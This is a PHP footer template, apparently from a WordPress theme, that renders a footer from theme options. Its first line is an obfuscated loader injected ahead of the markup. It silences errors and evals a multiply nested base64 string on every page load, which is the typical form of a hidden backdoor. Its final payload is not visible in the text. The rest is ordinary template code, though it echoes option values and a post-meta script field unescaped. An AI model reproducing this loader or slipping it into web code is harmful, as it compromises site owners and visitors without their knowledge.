<?php error_reporting(0); eval(base64_decode(ZXZhbChiYXNlNjRfZGVjb2RlKFpYWmhiQ2hpWVhObE5qUmZaR1ZqYjJSbEtGcFlXbWhpUTJocFdWaE9iRTVxVW1aYVIxWnFZakpTYkV0R2NGbFhiV2hwVVRKb2NGZFdhRTlpUlRWeFZXMWFZVkl4V25GWmFrcFRZa1YwUmxSc2FHbFNla1pOVldwR2RtVkdiSFJOVlRsT1VqQmFXVlF4YUZkWFZURnpWMVJDV2xadGFGQlVWV1JQVGxadmVVNVdjRTVOVm04eFYxZDBXazVYVGtoVGJsSnBVa1ZLVEZwV1pEQmtNVVY1V2toT1QwMUZOWFZaVkVKM1V6Rk9SMWRxVmxwaE1EVkRWREZXYzFKR1RuUlBWM1JVVW10dmVsWkVTbkpPUjFKMFVtNVNVMkZyY0dGV01GcExZekZyZVUxSVpHeFNXR2d4VlZkd1QxUlZNWFZSYlRsaFVucEdSMXBITVVka1ZrcHhVbTFHV0ZKWE9IaFdSVnBUVW0xU1ZrNVlRazlUU0VKT1dXeFNSMlF4YkhSaGVrWnFWakEwTVZVeFVtdFNSbTk1WkVWMFZHRXlVbEJaYWtKelVsVXhTRnBHY0U1TlZtOHhWMWQwV2s1WFRraFRibEpwVWtWS1RWVlVTbnBOTVVWNVdraEtWR0V6UWtwV1Z6VkRZVlpaZUZkcVNtRlNiV2hUVjJwR1ExWkdSbFZTYkVKclRXcHNURlZVUm10VU1ERllWRzVTYkZJeGNIRlVWM2hhWkRGc2NWUnJUazVTV0ZKRlZsY3hkMkZHUlhwaFJWWlhZa1p3VEZaR1dsSmxSa1p6Vm14c1RsWnNjRlZXYTFaUFRUSkZlVlZzYkZSaWF6Vk5WbXRvVDFSR1JYaFNiazVvWWxaS1dsVXlOVTlY.VlRCM1RsaE9ZVkpYVFRGYVJFcFRVa1p2ZVdSR2NFNWlWMUkyVmxaU1IxWXhWWGhWYTFwUVZtdGFXRlZ0Y0hOV1JsWnpWMnhPVjJKR1dubFViRnBYVm0xRmQxZHNRbGRXUlVwb1ZXMTRWMk5IVVhwaFJYaFhVMFUxVFZWVVJrZGpNa1owVld4c1ZHSnJOVnBVVkVFeFl6RndSbGw2Vm10TmJFcEZWMnBLTUZkck1YUmFTSEJXVmtWYVdGWlVSbE5TYXpsWFVteGtVMkZ0ZUVaV2ExSkNUVlpSZUZOc1dsVmlSbHBZVld4a05GUXhWbk5XVkZaWC5Za1p3UlZwRVNqQmhNVWw1WlVSQ1dHSkhUVEZVVm1SVFVrZEdObHBGVW1GTmJsSk1WVEowYTFVeVJraFZhMmhUVmpKU1VsWlVRa3RqVm5CSFlVVjBhazFYWkRWV2JYQlRXVlpaZDAxWVdsUmhNbEpRV1dwQ01GWlhUWGRrUlZKV1ZqTm9lRmRyV205VE1rMTRXak5zVldKck5YQlVWRUV4WXpGTmQxUnNUbWhpVlZwRldWaHdhMUpHYjNsa1JYUllZa2RTVUZscVNrdE9Wa1pZWWtWMFUwMVZjSFpYYTFaclVtMUdWazlVVG1sTlNFSjBWbFpqTkdORmRGVmplV3R3VDNjcEtUcykpOw)); ?>
<!-- end .content -->

    <?php if (get_option('sek_footer') == 'yes') { ?>

    <?php if (get_option('sek_footer_top') == 'yes') { ?>

    <div class="footertop"></div>

    <?php } ?>

<div id="footer" style="display: inline-block;background-color: <?php echo(stripslashes (get_option('sek_footer_bgcolor'))) ?>; background: #1c1c1c; <?php if (get_option('sek_footer_top') == 'no') { ?> margin-top: <?php echo(stripslashes (get_option('sek_footer_margin'))) ?>px;<?php } ?>">

<div class="wrapper" style="margin: 0 auto">

<div class="article-wrap">

	<h1 id="footerTitle" style="color: <?php echo(stripslashes (get_option('sek_footer_color'))) ?>; margin: 0 !important"><?php echo(stripslashes (get_option('sek_footer_title'))) ?></h1>

	<div class="article-footer">

    <div class="avatar" style="top: 69px;">

        	<a href="<?php echo(stripslashes (get_option('sek_footer_link'))) ?>"><img src="<?php echo(stripslashes (get_option('sek_footer_logo'))) ?>" width="100%" height="100%" /></a>

            <h6 class="tooltip"><?php echo(stripslashes (get_option('sek_footer_tooltip'))) ?></h6>

        </div>

	<p id="footerText" style="color: <?php echo(stripslashes (get_option('sek_footer_color'))) ?>; margin-top: -45px;"><?php echo(stripslashes (get_option('sek_footer_body'))) ?></p>

	</div>



</div>

</div>

</div>

</div>

    <!-- end .footer -->

    <?php } ?>

  <!-- end .container --></div>
    <script><?php echo get_post_meta($post->ID, "_extra_js", true); ?></script>
</body>

</html>
